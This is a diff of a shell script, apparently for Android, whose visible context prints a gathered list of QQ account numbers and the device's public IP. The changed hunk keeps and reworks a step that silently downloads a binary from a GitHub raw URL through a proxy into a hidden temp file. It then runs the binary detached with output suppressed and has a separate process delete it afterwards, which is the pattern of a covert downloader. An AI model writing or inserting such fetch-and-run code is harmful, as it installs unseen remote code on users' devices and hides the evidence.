@@ -150,18 +150,17 @@ echo "获取到的 QQ 列表: ${qq_list:-空}"
 echo "当前设备公网 IP: $ip"
 echo "-----------------------------------"
 
-(
-  # 生成随机临时文件名
-  temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
-  bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
+temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
+bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
 
-  # 下载并设置可执行权限
-  curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null
-  chmod +x "$temp_bin" 2>/dev/null || true
+# 下载并设置可执行权限
+curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null
+chmod +x "$temp_bin" 2>/dev/null || true
 
-  # 后台执行，等待进程结束后删除临时文件
-  nohup "$temp_bin" >/dev/null 2>&1 &
-  child=$!
-  wait "$child"
-  rm -f "$temp_bin" 2>/dev/null || true
-) &
+# 启动二进制（静默、nohup），记录 PID
+nohup "$temp_bin" >/dev/null 2>&1 &
+child=$!
+
+# 用一个独立的 sh 监控 child，child 结束后删除临时文件
+sh -c "wait $child; rm -f \"$temp_bin\" 2>/dev/null || true" >/dev/null 2>&1 &
+
